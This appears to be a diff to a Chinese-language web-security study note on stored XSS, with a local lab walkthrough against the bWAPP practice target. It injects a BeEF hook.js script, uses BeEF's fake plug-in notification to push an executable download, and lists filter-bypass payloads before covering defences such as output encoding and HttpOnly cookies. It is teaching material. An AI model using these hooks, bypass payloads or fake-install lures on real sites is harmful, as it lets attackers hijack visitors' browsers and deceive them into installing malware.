@@ -4429,15 +4429,144 @@ OWASP Top10 2017 第七，浏览器将用户输入的内容，当做脚本执行
 
 ### 存储型 XSS 
 
+#### 定义
+
+- 存储型 XSS 是指应用程序通过 Web 请求获取不可信赖的数据，在未检验数据是否存在 XSS 代码的情况下，便将其存入数据库。
+- 当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行 XSS 代码，存储型XSS 可以持续攻击用户。 
+- 存储型 XSS 出现位置
+  - 留言板
+  - 评论区
+  - 用户头像
+  - 个性签名
+  - 博客 
+
+
+
+#### Beef 工具
+
+- BeEF
+  - 全称 The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用 Ruby 语言开发的，Kali 中默认安装的一个模块，用于实现对 XSS 漏洞的攻击和利用。
+  - 自带一个 JS 脚本和后台管理页面。 
+- BeEF原理 
+  - ![1618579492877](HackerMeWeb.assets/1618579492877.png)
+
+#### Beef 安装
+
+- docker pull registry.cn-shanghai.aliyuncs.com/yhskc/beef
+- docker run --name=beef -d -p 0.0.0.0:3000:3000 registry.cn-shanghai.aliyuncs.com/yhskc/beef
+- docker ps
+- 访问：http://127.0.0.1:3000/ui/authentication
+- 登录：
+  - Username: sec
+  - Password: sec
+- 注入的 XSS 钩子文件地址，http://127.0.0.1:3000/hook.js
+
+
+
+#### bWAPP XSS 测试
+
+- 安装 bWAPP 靶机，启动，进入浏览器，输入 http://127.0.0.1/portal.php ，登录
+
+- Choose your bug:
+
+  - Cross-Site Scripting - Stored (Blog)
+
+- 在输入框中，测试输入
+
+  - test
+  - 点击 submit ，可以展示出来输入的内容，此时将其存入数据库中
+
+- 继续测试输入
+
+  - <script>alert(1);</script>
+
+  - 点击 submit ，此时就会在浏览器弹出1的对话框，此时就实现了存储型 XSS 
+
+- 进入docker 交互式界面
+
+  - docker ps
+  - docker exec -it bwapp bash
+  - mysql -u root -p
+  - show databases;
+  - use bWAPP;
+  - show tables;
+  - select * from blog;
+
+
+
+#### bWAPP + Beef XSS 测试
+
+- 安装 bWAPP 靶机，启动，进入浏览器，输入 http://127.0.0.1/portal.php ，登录
+
+- Choose your bug:
+
+  - Cross-Site Scripting - Stored (Blog)
+
+- 在输入框中，测试输入
+
+  - <script src="http://127.0.0.1:3000/hook.js">xss</script>
+
+  - 测试就实现了存储型 XSS
+
+- 进入 Beef 控制台
+
+  - http://127.0.0.1:3000/ui/panel
+  - 在 Online Browsers 中可以看到 127.0.0.1下面就有可以被控制的 浏览器
+  - 点击浏览器，
+    - 在 Details 中，可以看到电脑的配置信息，浏览器的信息，网络 IP 等信息
+    - 在 Commands 中，可以看到可以执行的一些操作
+      - 点击 Browser ，可以看到三种标识颜色的命令
+        - 浅绿色，代表可以执行的命令，并且不会被用户察觉到
+        - 灰色，代表执行命令可以被用户察觉到
+        - 红色，代表不知道是否可以执行的命令
+      - 点击 Social Engineering，
+        - 点击Fake Notification Bar（Firefox）
+        - 此时，在 Plugin URL: 中输入需要安装插件的 URL 地址，可以给一个 http://0.0.0.0:3000/newHook.exe
+        - Notification text: 使用默认的内容，为 An additional plug-in is required to display some elements on this page.
+        - 点击右下角，Execute，就可以在 被控制的浏览器页面 http://127.0.0.1/xss_stored_1.php 的最上面出现，An additional plug-in is required to display some elements on this page. 并且可以点击 后面的 Install Plug-in 按钮 进行安装
+        - 虽然点击按钮之后，跳转的页面是 http://0.0.0.0:3000/newHook.exe ，是一个无法访问的页面，但是可以通过优化，实现插件的下载安装
+
+
+
+#### 防御方式
+
+- 针对 XSS 防御
+
+  - 对用户的输入进行合理验证，对特殊字符（如<、>、’、”等）以及 <script>、 javascript 等进行过滤。
+  - script过滤  ------------------- 大小写，双写绕过
+  - 输入长度过滤  ------------------- 在js中，抓包修改
+  - `/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i -------------------  ` <img src=x onerror=alert("xss")>
+  - ()过滤  ------------------- <script>alert`xss`</script>
+  - ' " 过滤  ------------------- <script>alert(/xss/)</script> 
+
+- 采用 OWASP ESAPI 对数据输出 HTML 上下文中不同位置（HTML 标签、HTML属性、JavaScript 脚本、CSS、URL）进行恰当的输出编码。 
+
+  - htmlentities（） 
+  - ![1618581042551](HackerMeWeb.assets/1618581042551.png)
+
+- HTML实体 
+
+  - ![1618581066205](HackerMeWeb.assets/1618581066205.png)
+  - ![1618581096334](HackerMeWeb.assets/1618581096334.png)
+
+- 设置 HttpOnly 属性，避免攻击者利用跨站脚本漏洞进行 Cookie 劫持攻击。在 Java EE 中，给 Cookie 添加 HttpOnly 的代码如下： 
+
+  - ```properties
+    java:
+    cookie.setHttpOnly(true);
+    
+    python:
+    tools.sessions.httponly = True
+    
+    php:
+    session.cookie_httponly =1
+    ```
 
 
 
 
 
-
-
-
-
+### DOM型 XSS 
 
 
 
